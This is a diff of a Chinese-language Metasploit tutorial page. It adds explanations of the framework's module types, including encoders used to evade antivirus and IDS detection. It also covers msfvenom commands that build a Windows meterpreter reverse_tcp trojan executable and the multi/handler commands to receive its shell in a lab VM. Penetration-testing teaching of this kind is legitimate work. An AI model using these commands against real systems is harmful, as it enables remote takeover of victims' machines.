@@ -1285,10 +1285,26 @@
 <p><img src="https://cdn.jsdelivr.net/gh/qnjy/giteeimg/img/20220324-cb589f2d4af04031a121b69cfe7b77b7.png" alt="img"></p>
 <p>模块分为：</p>
 <p>辅助模块———————AUX(auxiliary module)</p>
-<p>渗透攻击模块————exploits</p>
-<p>后渗透攻击模块———post</p>
+<blockquote>
+<p>该模块不会直接在测试者和目标主机之间建立访问，他们只负责执行</p>
+<p>扫描、嗅探、指纹识别等相关功能以辅助渗透测试</p>
+</blockquote>
+<p>漏洞利用模块————exploits</p>
+<blockquote>
+<p>漏洞利用是指由渗透测试者利用一个系统、应用或者服务中的安全漏洞<br>进行的攻击行为。流行的渗透攻击技术包括缓冲区溢出、Web应用程序<br>攻击，以及利用配置错误等，其中包含攻击者或渗透测试人员针对系统<br>中的漏洞而设计的各种POC验证程序，用于破坏系统安全性的攻击代码，<br>每个漏洞都有相应的攻击代码。</p>
+</blockquote>
 <p>攻击载荷模块————-payloads</p>
-<p>编码器模块——————encoders</p>
+<blockquote>
+<p>攻击载荷是我们期望目标系统在被渗透攻击之后完成实际攻击功能的代码，<br>成功渗透目标后，用于在目标系统上运行任意命令或者执行特定代码，<br>在Metasploit框架中可以自由地选择、传送和植入。攻击载荷也可能<br>是简单地在目标操作系统系统上执行一些命令，如添加用户账号等。</p>
+</blockquote>
+<p>后渗透攻击模块———post</p>
+<blockquote>
+<p>该模块主要用于在取得目标系统远程控制权后，进行一系列的后渗透<br>攻击动作，如获取敏感信息、实施跳板攻击等。</p>
+</blockquote>
+<p>编码工具模块——————encoders</p>
+<blockquote>
+<p>该模块在渗透测试中负责免杀，以防止被杀毒软件、防火墙、<br>IDS及类似的安全软件检测出。</p>
+</blockquote>
 <p>空指令模块——————nops</p>
 <h1 id="2-MSF基本使用"><a href="#2-MSF基本使用" class="headerlink" title="2 MSF基本使用"></a>2 MSF基本使用</h1><h2 id="2-1-功能模块"><a href="#2-1-功能模块" class="headerlink" title="2.1 功能模块"></a>2.1 功能模块</h2><p><img src="https://qnjy.coding.net/p/githubimg/d/githubimg/git/raw/master/img/20220403-image-20220403202025307.png" alt="image-20220403202025307"></p>
 <p>MSF主目录为/usr/share/metasploit-framework/,其中包括了config配置文件、plugins插件、tools工具、db数据库文件、modules模块文件以及msfconsole、msfdb等命令，modules中的文件为我们最常用的模块文件，其中每个模块中都根据不同的操作系统，分为不同平台不同协议功能对应的漏洞利用文件，这些文件用ruby编写。</p>
@@ -1337,6 +1353,9 @@
 </ol>
 <h2 id="6-2-生成可执行木马"><a href="#6-2-生成可执行木马" class="headerlink" title="6.2 生成可执行木马"></a>6.2 生成可执行木马</h2><ol>
 <li><p>命令：<code>msfvenom -p windows/meterpreter/reverse_tcp lhost=本地ip lport=本地端口号 -f exe -o 文件名.exe</code></p>
+<blockquote>
+<p>设置lhost，即监听主机IP和lport监听端口，这里用的虚拟机测试，所以用的192.168.200.133，端口为1111，最后会通向192.168.200.133的1111端口</p>
+</blockquote>
 <p><img src="https://cdn.jsdelivr.net/gh/qnjy/giteeimg/img/20220325-image-20220325120742191.png" alt="image-20220325120742191"></p>
 <blockquote>
 <p>大致参数介绍</p>
@@ -1363,8 +1382,9 @@
 </li>
 <li><p>配置参数</p>
 <p>(1)命令： <code>use exploit/multi/handler</code>（选择模块）</p>
-<p>(2)命令： <code>set payload windows/meterpreter/reverse_tcp</code>（选择攻击模块）</p>
-<p>(3)命令： <code>set LhOST 192.168.32.1</code>（填写自己主机的IP地址）</p>
+<p>(2)因为之前用的是reverse_tcp，所以设置如下：</p>
+<p>命令： <code>set payload windows/meterpreter/reverse_tcp</code>（选择攻击模块）</p>
+<p>(3)命令： <code>set lhost 192.168.32.1</code>（填写自己主机的IP地址）</p>
 <p>(4)命令： <code>set lport 1111</code>（填写刚才生成文件时的端口号）</p>
 <p>(5)命令： <code>show options</code>（查看设置参数）</p>
 <p>(6)命令： <code>exploit -z -j</code>（后台执行）</p>
